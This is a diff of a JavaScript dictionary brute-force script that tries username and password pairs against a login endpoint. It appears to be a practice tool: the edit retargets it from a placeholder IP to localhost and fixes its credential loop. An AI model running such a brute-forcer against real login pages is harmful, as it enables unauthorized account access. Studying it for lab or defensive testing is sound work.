@@ -6,8 +6,8 @@ const dicionario = {
 let data = {};
 let find = {};
 
-const ip = 'SEU_IP';
-const urlAlvo = `http://${ip}:4343/login`;
+const base = 'localhost';
+const urlAlvo = `http://${base}:4343/login`;
 
 let l = 0, s = 0;
 let count = 0;
@@ -31,15 +31,17 @@ function sendAjax() {
                 endFB(user);
             },
             401: () => {
-                if (l++ > dicionario.logins.length) {
-                    l = 0;
-                    if (s++ > dicionario.senhas.length) {
-                        s = 0;
-                    }
-                }
-                if (l >= dicionario.logins.length && s >= dicionario.senhas.length) {
+                if (l+1 >= dicionario.logins.length && s+1 >= dicionario.senhas.length) {
                     endFB({user:"Não encontrado"});
                 } else {
+                    l++;
+                    if (l >= dicionario.logins.length) {
+                        l = 0;
+                        s++;
+                        if (s >= dicionario.senhas.length) {
+                            s = 0;
+                        }
+                    }
                     sendAjax();
                 }
             }
